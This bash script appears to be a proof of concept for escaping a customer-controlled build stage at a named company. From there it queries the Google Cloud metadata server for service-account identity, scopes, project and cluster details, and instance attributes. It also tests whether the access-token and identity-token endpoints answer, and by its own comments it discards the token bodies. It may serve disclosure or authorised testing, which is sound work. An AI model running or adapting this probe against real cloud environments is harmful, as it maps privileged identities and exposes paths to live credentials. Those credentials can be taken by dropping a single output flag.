#!/usr/bin/env bash
# GKE Metadata Server exposure from the customer-controlled build stage.
# Captures identity + scopes + project RAW. For the token endpoint it records ONLY
# status/length and NEVER the body - deliberately, so no live Yext cloud credential is captured.
set +e
B="YEXTP4"; echo "$B-BEGIN"
M=http://169.254.169.254/computeMetadata/v1
H='Metadata-Flavor: Google'
g(){ echo "--- $1"; curl -s -m 6 -H "$H" "$M$1" 2>&1 | head -c 1200; echo; }
echo "$B-IDENTITY-START"
g "/instance/service-accounts/"
g "/instance/service-accounts/default/"
g "/instance/service-accounts/default/email"
g "/instance/service-accounts/default/scopes"
g "/instance/service-accounts/default/aliases"
echo "$B-IDENTITY-END"
echo "$B-PROJECT-START"
g "/project/project-id"
g "/project/numeric-project-id"
g "/instance/zone"
g "/instance/id"
g "/instance/machine-type"
g "/instance/cluster-name"
g "/instance/cluster-location"
echo "$B-PROJECT-END"
echo "$B-TOKEN-REACHABLE-START"
echo "NOTE: body intentionally discarded; status+length only."
for p in "/instance/service-accounts/default/token" "/instance/service-accounts/default/identity?audience=https://example.com"; do
  echo "--- $p : $(curl -s -m 6 -H "$H" -o /dev/null -w 'http=%{http_code} content_length=%{size_download}' "$M$p" 2>&1)"
done
echo "$B-TOKEN-REACHABLE-END"
echo "$B-ATTRS-START"
g "/instance/attributes/"
echo "$B-ATTRS-END"
echo "$B-END"; exit 0
